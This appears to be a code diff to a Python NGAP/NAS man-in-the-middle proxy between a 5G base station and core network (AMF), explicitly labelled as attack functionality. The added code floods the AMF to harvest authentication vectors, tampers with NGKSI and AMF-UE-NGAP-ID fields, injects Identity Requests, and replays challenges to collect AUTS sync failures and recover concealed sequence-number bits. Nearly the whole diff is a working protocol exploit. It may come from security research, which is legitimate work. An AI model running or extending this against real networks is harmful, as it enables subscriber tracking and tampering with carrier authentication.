@@ -30,6 +30,7 @@ NAS_AUTH_REQUEST = 0x56
 
 CAUSE_MAC_FAILURE  = 0x14
 CAUSE_SYNC_FAILURE = 0x15
+CAUSE_NGKSI_IN_USE = 0x47
 
 # NGAP procedure codes
 PROC_INITIAL_UE = 15
@@ -38,6 +39,11 @@ PROC_DOWNLINK_NAS = 4
 
 # PPID for AMF, else failure
 NAS_PPID = 60
+
+# Attack config
+N_BITS          = 4
+N_SETUP_VECTORS = 2 ** N_BITS  
+
 
 # NGAP helpers
 def NGAP_PDU():
@@ -120,7 +126,7 @@ def set_nas_pdu(pdu, new_nas: bytes) -> bytes | None:
 # ATTACK FUNCTIONALITY
 
 # AUTS functions
-def get_auts (nas_bytes: bytes) -> bytes | None:
+def get_auts(nas_bytes: bytes) -> bytes | None:
     try:
         msg, err = parse_NAS5G(nas_bytes)
         if err:
@@ -149,6 +155,136 @@ def record_auts(ran_ue_id: int, auts: bytes, j: int, delta: int | None, baseline
     print(f"Recorded AUTS j={j}: {entry}")
 
 
+# TO PREVENT NGKSI ERRROR
+def increase_ngksi(nas_bytes: bytes) -> bytes | None:
+    try:
+        msg, err = parse_NAS5G(nas_bytes)
+        if err or msg is None:
+            return None
+        ksi = msg["NAS_KSI"]["NAS_KSI"]["Value"].get_val()
+        print(ksi)
+        msg["NAS_KSI"]["NAS_KSI"]["Value"].set_val((ksi + 1) % 7)
+
+        print(msg["NAS_KSI"]["NAS_KSI"]["Value"].get_val())
+        return msg.to_bytes()
+
+    except Exception as e:
+        print(f"ERROR - NGKSI update failed: {e}")
+        return None
+
+def increase_ngksi_in_ngap_bytes(ngap_bytes: bytes):
+    try:
+        pdu = decode_ngap(ngap_bytes)
+        if pdu is None:
+            print("ERROR - could not decode NGAP")
+            return None, None
+
+        nas = get_nas_pdu(pdu)
+        if nas is None:
+            print("ERROR - NAS-PDU IE not found")
+            return None, None
+
+        new_nas = increase_ngksi(nas)
+        if new_nas is None:
+            print("ERROR - failed to increase NGKSI")
+            return None, None
+
+        # Read the new KSI value from the modified NAS bytes
+        msg, err = parse_NAS5G(new_nas)
+        if err or msg is None:
+            print("ERROR - could not re-parse modified NAS")
+            return None, None
+        new_ksi = msg["NAS_KSI"]["NAS_KSI"]["Value"].get_val()
+
+        rebuilt = set_nas_pdu(pdu, new_nas)
+        if rebuilt is None:
+            print("ERROR - failed to rebuild NGAP")
+            return None, None
+
+        return rebuilt
+
+    except Exception as e:
+        print(f"ERROR - increase_ngksi_in_ngap_bytes failed: {e}")
+        return None, None
+
+
+# PREVENT ERRORINDIATION
+def get_amf_ue_ngap_id(pdu) -> int | None:
+    try:
+        root = pdu.get_val()
+        ies = root[1]["value"][1]["protocolIEs"]
+
+        for ie in ies:
+            if ie["id"] == 10:  # id-AMF-UE-NGAP-ID
+                val = ie["value"]
+
+                # Common pycrate shape: ('AMF-UE-NGAP-ID', 1656)
+                if isinstance(val, tuple) and len(val) >= 2:
+                    return val[1]
+
+                # Fallback in case it's already an int
+                if isinstance(val, int):
+                    return val
+
+                print(f"Unexpected AMF-UE-NGAP-ID value format: {val!r}")
+                return None
+
+        print("AMF-UE-NGAP-ID IE not found")
+        return None
+
+    except Exception as e:
+        print(f"ERROR - get_amf_ue_ngap_id failed: {e}")
+        return None
+    
+
+def set_amf_ue_ngap_id(pdu, new_amf_ue_id: int) -> bytes | None:
+    try:
+        root = pdu.get_val()
+        ies = root[1]["value"][1]["protocolIEs"]
+
+        for ie in ies:
+            if ie["id"] == 10:  # id-AMF-UE-NGAP-ID
+                old_val = ie["value"]
+
+                # Most common pycrate decoded form
+                if isinstance(old_val, tuple) and len(old_val) >= 2:
+                    ie["value"] = (old_val[0], new_amf_ue_id)
+
+                # Fallback if decoded form is already plain int
+                elif isinstance(old_val, int):
+                    ie["value"] = new_amf_ue_id
+
+                else:
+                    print(f"ERROR - unexpected AMF-UE-NGAP-ID format: {old_val!r}")
+                    return None
+
+                pdu.set_val(root)
+                return pdu.to_aper()
+
+        print("ERROR - AMF-UE-NGAP-ID IE not found")
+        return None
+
+    except Exception as e:
+        print(f"ERROR - set_amf_ue_ngap_id failed: {e}")
+        return None
+    
+
+def create_identity_request_ngap(ran_ue_id: int, amf_ue_id: int):
+    # NAS: 5GMM Identity Request (SUCI=1)
+    nas_payload = bytes([0x7e, 0x00, 0x5b, 0x01])
+    pdu = NGAP_PDU()
+    pdu.set_val(('initiatingMessage', {
+        'procedureCode': PROC_DOWNLINK_NAS,
+        'criticality': 'ignore',
+        'value': ('DownlinkNASTransport', {
+            'protocolIEs': [
+                {'id': 10, 'criticality': 'reject', 'value': ('AMF-UE-NGAP-ID', amf_ue_id)},
+                {'id': 85, 'criticality': 'reject', 'value': ('RAN-UE-NGAP-ID', ran_ue_id)},
+                {'id': 38, 'criticality': 'reject', 'value': ('NAS-PDU', nas_payload)}
+            ]
+        })
+    }))
+    return pdu.to_aper()
 
 
 # ATTACK STATE
@@ -157,20 +293,24 @@ _attack_state:  dict[int, dict]   = {}   # ran_ue_id → attack phase state
 _state_lock = Lock()
 
 
-def init_attack_state(ran_ue_id: int, n_bits: int = 32):
+def init_attack_state(ran_ue_id: int):
     with _state_lock:
         _attack_state[ran_ue_id] = {
-            "phase":      "await_baseline", # "idle" | "await_baseline" | "baseline_done" | "await_accept" | "await_sync"
+            "phase":      "setup", # "setup" | "idle" | "await_baseline" | "baseline_done" | "await_accept" | "await_sync"
             "j":          0, # current bit index
-            "n":          n_bits, # total bits to recover (e.g. 32)
+            "n":          N_BITS, # total bits to recover (e.g. 32)
             "baseline":   None, # CONC* from first replay
             "deltas":     [], # CONC*_j XOR baseline, gained info per j
-            "replay_pdu": None, # raw NGAP bytes of R0,AUTN0 to replay
+            "auth_vectors": [],  # raw NGAP downlink NAS frames, index i = vector i
+            "edit_baseline": None, # raw NGAP uplink NAS frame with diff NGKSI
+            "amf-id":0,
+            "ksi_uses":1,
+            "_pending_phase": None,
         }
+
 def get_state(ran_ue_id: int) -> dict | None:
     with _state_lock:
         return _attack_state.get(ran_ue_id)
-
 
 def set_phase(ran_ue_id: int, phase: str, **kwargs):
     with _state_lock:
@@ -179,31 +319,37 @@ def set_phase(ran_ue_id: int, phase: str, **kwargs):
             state["phase"] = phase
             state.update(kwargs)
 
-def repeat_replay(gnb_sock, ran_ue_id: int):
+# Replay baseline
+
+def send_r0(gnb_sock, ran_ue_id: int, next_phase: str, label: str = "R0,AUTN0"):
     state = get_state(ran_ue_id)
-
-    if state and state["replay_pdu"]:
-        print(f"Replay R0,AUTN0 (j={state['j']}) for RAN-UE: {ran_ue_id}")
-        gnb_sock.sctp_send(state["replay_pdu"], ppid=NAS_PPID)
-        set_phase(ran_ue_id, "await_sync")
-
-
-
-
+    if not state or not state["auth_vectors"]:
+        print(f"ERROR - no vectors stored for RAN-UE: {ran_ue_id}")
+        return
+    print(f"Sending {label} (j={state['j']}) to UE")
+    gnb_sock.sctp_send(state["edit_baseline"], ppid=NAS_PPID)
+    state["edit_baseline"] = increase_ngksi_in_ngap_bytes(state["edit_baseline"])
+    set_phase(ran_ue_id, next_phase)
 
 
 
 
 
-
-
-
-
-
-
-
-
-
+def send_auth_vector(gnb_sock, ran_ue_id: int):
+    """
+    Send R_{2^j},AUTN_{2^j} to the UE.
+    Vector index = 2^j.  We collected indices 0..N_SETUP_VECTORS-1 so
+    index 2^j is always available for j < N_BITS.
+    """
+    state = get_state(ran_ue_id)
+    j     = state["j"]
+    idx   = 2 ** j
+    vecs  = state["auth_vectors"]
+    if idx >= len(vecs):
+        print(f"  ERROR - no vector at index {idx} for j={j} (have {len(vecs)})")
+        return
+    print(f"  → Sending R_{{2^{j}}}=vec[{idx}] to UE (j={j})")
+    gnb_sock.sctp_send(vecs[idx], ppid=NAS_PPID)
 
 
 
@@ -222,60 +368,152 @@ def uplink(gnb_sock, amf_sock):
             pdu  = decode_ngap(data)
             proc = get_procedure_code(pdu) if pdu else None
 
+            # IDENTITY RESPONSE — after NGKSI wraparound reset
+            
+            # ── Initial UE Message ────────────────────────────────────────────
+            if pdu and proc == PROC_INITIAL_UE:
+                ran_ue_id = get_ran_ue_id(pdu)
+                print(f"Initial UE Message — RAN-UE-NGAP-ID: {ran_ue_id}")
+
+                if get_state(ran_ue_id) is None:
+                    init_attack_state(ran_ue_id)
+
+                state = get_state(ran_ue_id)
+
+                if state["phase"] == "setup":
+                    # Blast N_SETUP_VECTORS copies to AMF so it queues up that
+                    # many auth vectors for us to harvest in the downlink thread.
+                    print(f"Setup: sending Initial UE {N_SETUP_VECTORS}x to AMF")
+                    for _ in range(N_SETUP_VECTORS):
+                        amf_sock.sctp_send(data, ppid=NAS_PPID)
+                    print(f"Setup: {N_SETUP_VECTORS} requests sent, collecting vectors...")
+                    # Do NOT forward to UE / do not send anything to UE yet.
+                    continue
+            
             # Auth response
             if pdu and proc == PROC_UPLINK_NAS:
                 ran_ue_id = get_ran_ue_id(pdu)
-                print(f"Authentication Response/Failure — RAN-UE-NGAP-ID: {ran_ue_id}")
                 nas = get_nas_pdu(pdu)
                 state = get_state(ran_ue_id)
 
+                # print(f"Authentication Response/Failure — RAN-UE-NGAP-ID: {ran_ue_id}")
 
                 if nas and state:
                     msg_type = get_nas_msg_type(nas)
-                    print("message type",msg_type)
+                    print(f"Uplink msg={msg_type:#x} phase={state['phase']}")
+
+
+                    if msg_type == 0x5c:  # Identity Response
+                        if state["phase"] == "await_identity_resp":
+                            pending = state.get("_pending_phase", "await_baseline_sync")
+                            print(f"  Identity Response — resending R0 to resume phase={pending}")
+                            # Forward identity response to AMF to keep it happy
+                            amf_sock.sctp_send(data, ppid=NAS_PPID)
+                            # Resend R0 — UE context is now reset so KSI is fresh
+                            send_r0(gnb_sock, ran_ue_id,
+                                    next_phase=pending,
+                                    label="R0 (post-identity-reset)")
+                            continue
+
+
+
                     
                     # AUTH RESPONSE
                     if msg_type == NAS_AUTH_RESPONSE:
                         print(f"Auth Response (accepted) — RAN-UE: {ran_ue_id}, phase: {state['phase']}")
-                        if state["phase"] == "await_baseline" or state["phase"] == "await_accept":
-                            repeat_replay(gnb_sock, ran_ue_id)
+                        
+                        if state["phase"] == "await_baseline_accept":
+                            # UE accepted R0,AUTN0 for the first time.
+                            # Forward the Auth Response to AMF (keep network happy),
+                            # then immediately replay R0,AUTN0 — UE's SQN_UE is now
+                            # SQN_HN(AUTN0)+1, so the replay will trigger SYNC failure.
+                            print(f"  Auth Response — baseline accepted replaying R0,AUTN0")
+                            send_r0(gnb_sock, ran_ue_id,
+                                    next_phase="await_baseline_sync",
+                                    label="R0,AUTN0 replay (baseline)")
                             continue
-                    
+
+                        elif state["phase"] == "await_j_accept":
+                            # UE accepted R_{2^j},AUTN_{2^j}.
+                            # Forward to AMF, then replay R0,AUTN0 to get AUTS_j.
+                            j = state["j"]
+                            print(f"  Auth Response — j={j} accepted, forwarding to AMF + replaying R0,AUTN0")
+                            send_r0(gnb_sock, ran_ue_id,
+                                    next_phase="await_j_sync",
+                                    label=f"R0,AUTN0 replay (j={j})")
+                            continue
+                        
+                        elif state["phase"] in ("await_baseline_sync", "await_j_sync"):
+                            print("Auth response when not expected")
+                            j = state["j"]
+
+                            send_r0(gnb_sock, ran_ue_id,
+                                        next_phase="await_j_sync",
+                                        label=f"R0,AUTN0 replay (j={j})")
+                            continue
+
+
+
                     # AUTH FAILURE
                     if msg_type == NAS_AUTH_FAILURE:
                         failure_cause = get_nas_msg_fail_cause(nas)
-                        # print("failure cause",failure_cause)
-                         
-                        if failure_cause == CAUSE_MAC_FAILURE:
-                            print(f"MAC Failure — RAN-UE: {ran_ue_id} (not target or wrong challenge)")
+                        print(f"  Auth Failure cause={failure_cause:#x} phase={state['phase']}")
 
-                        elif failure_cause == CAUSE_SYNC_FAILURE and state["phase"] == "await_sync":
-                            auts = get_auts(nas)
-                            print("autn",auts)
-                            if auts:
-                                conc_star = auts[:6]
-                                conc_int  = int.from_bytes(conc_star, "big")
 
-                                if state["baseline"] is None:
-                                    print(f"  Baseline CONC*_0: {conc_star.hex()}")
-                                    set_phase(ran_ue_id, "await_accept", baseline=conc_int)
+                        # NGKSI already in use — send Identity Request to reset UE context,
+                        # then resend the same R0 (stored pending_phase tells us where to resume)
+                        if failure_cause == CAUSE_NGKSI_IN_USE:
+                            print(f"  NGKSI in use — sending Identity Request to reset, will resend R0")
+                            set_phase(ran_ue_id, "await_identity_resp",
+                                    _pending_phase=state["phase"])  # remember where we were
+                            pdu_ir = create_identity_request_ngap(ran_ue_id, state["amf-id"])
+                            gnb_sock.sctp_send(pdu_ir, ppid=NAS_PPID)
+                            continue
 
-                                else:
-                                    j     = state["j"]
-                                    delta = conc_int ^ state["baseline"]
-                                    state["deltas"].append(delta)
-                                    print(f"  j={j}: CONC*={conc_star.hex()}, δ={delta:#014x}")
 
-                                
-                                    record_auts(ran_ue_id, auts, j=j,delta=delta,baseline_hex=hex(state["baseline"]))
-                                    j += 1
-                                    if j >= state["n"]:
-                                        print(f"Attack complete — RAN-UE: {ran_ue_id}")
-                                        print(f"Deltas: {[hex(d) for d in state['deltas']]}")
-                                        set_phase(ran_ue_id, "idle")
-                                    else:
-                                        set_phase(ran_ue_id, "await_accept", j=j)
-                        
+
+
+                        if state["phase"] in ("await_baseline_sync", "await_j_sync"):
+
+                            if failure_cause == CAUSE_MAC_FAILURE:
+                                print(f"MAC Failure — RAN-UE: {ran_ue_id}")
+
+                            elif failure_cause == CAUSE_SYNC_FAILURE:
+                                auts = get_auts(nas)
+                                if auts:
+                                    conc_star = auts[:6]
+                                    conc_int  = int.from_bytes(conc_star, "big")
+
+                                    if state["phase"] == "await_baseline_sync":
+                                        # This is AUTS' — the baseline concealed SQN.
+                                        print(f"  Baseline AUTS' CONC*_0: {conc_star.hex()}")
+                                        record_auts(ran_ue_id, auts, j=-1,
+                                                    delta=None, baseline_hex=None)
+                                        # Move to j=0: send R_{2^0}=R_1,AUTN_1
+                                        # (vector index 1, i.e. 2^0 = 1)
+                                        set_phase(ran_ue_id, "await_j_accept",
+                                                  baseline=conc_int, j=0)
+                                        send_auth_vector(gnb_sock, ran_ue_id)
+
+                                    else:  # await_j_sync
+                                        j     = state["j"]
+                                        delta = conc_int ^ state["baseline"]
+                                        state["deltas"].append(delta)
+                                        print(f"  j={j}: CONC*={conc_star.hex()} δ={delta:#014x}")
+                                        record_auts(ran_ue_id, auts, j=j,
+                                                    delta=delta,
+                                                    baseline_hex=hex(state["baseline"]))
+                                        j += 1
+                                        if j >= state["n"]:
+                                            print(f"  Attack complete — RAN-UE: {ran_ue_id}")
+                                            print(f"  Deltas: {[hex(d) for d in state['deltas']]}")
+                                            set_phase(ran_ue_id, "idle")
+                                        else:
+                                            set_phase(ran_ue_id, "await_j_accept", j=j)
+                                            send_auth_vector(gnb_sock, ran_ue_id)
+                            else:
+                                print(f"  Non-SYNC failure during replay (cause={failure_cause:#x}), dropping")
+                            
                             continue
                         
             amf_sock.sctp_send(data, ppid=NAS_PPID)
@@ -297,34 +535,67 @@ def downlink(gnb_sock, amf_sock):
 
             pdu  = decode_ngap(data)
             proc = get_procedure_code(pdu) if pdu else None
-            print(proc)
 
             if pdu and proc == PROC_DOWNLINK_NAS:
                 ran_ue_id = get_ran_ue_id(pdu)
-                nas = get_nas_pdu(pdu)
-                
+                nas       = get_nas_pdu(pdu)
+
                 if nas:
                     msg_type = get_nas_msg_type(nas)
 
                     if msg_type == NAS_AUTH_REQUEST:
-                        print(f"Downlink NAS AUTH REQUEST — RAN-UE-NGAP-ID: {ran_ue_id}")
                         state = get_state(ran_ue_id)
-
                         if state is None:
                             init_attack_state(ran_ue_id)
                             state = get_state(ran_ue_id)
 
-                        if state["phase"] == "await_baseline":
-                            with _state_lock:
-                                state["replay_pdu"] = data
-                        
+                        if state["phase"] == "setup":
+                            # Harvest vectors — never forward to UE during setup.
+                            if state["edit_baseline"] is None:
+                                rebuilt = set_nas_pdu(pdu, increase_ngksi(nas))
+                                state["amf-id"] = get_amf_ue_ngap_id(pdu)
+                                if rebuilt:
+                                    state["edit_baseline"] = rebuilt
+                                else:
+                                    state["edit_baseline"] = data
+                                    print("Failed to edit NAS baseline")
+                                
+                                state["auth_vectors"].append(data)
+                            else:
+                                new_amf_id = set_amf_ue_ngap_id(pdu, state["amf-id"])
+                            
+                                state["auth_vectors"].append(new_amf_id)
 
+
+                            n = len(state["auth_vectors"])
+                            print(f"  Setup: collected vector {n}/{N_SETUP_VECTORS}")
+                            # pp, er = parse_NAS5G(nas)
+                            # print(pp.show())
+
+                            if n >= N_SETUP_VECTORS:
+                                # All vectors collected.
+                                # NOW send R0,AUTN0 to UE for the first time.
+                                # The UE has never seen this challenge, so it will
+                                # accept it (MAC ok, SQN fresh).
+                                print(f"  Setup complete — sending R0,AUTN0 to UE for first time")
+                                set_phase(ran_ue_id, "await_baseline_accept")
+
+                               
+
+                                gnb_sock.sctp_send(state["auth_vectors"][0], ppid=NAS_PPID)
+                                # Do NOT fall through — don't send to gNB.
+
+                            continue  # Always suppress raw AMF auth requests from reaching UE
+
+            # Default: forward AMF → gNB
             gnb_sock.sctp_send(data, ppid=NAS_PPID)
 
         except Exception as e:
-            print(f"ERROR - downlink error {type(e).__name__}: {e}")
+            print(f"ERROR - downlink {type(e).__name__}: {e}")
             break
 
+        
+           
 # Connection handler
 def handle(gnb_sctp):
     print(f" gNB connected — opening AMF {AMF_IP}:{AMF_PORT}")
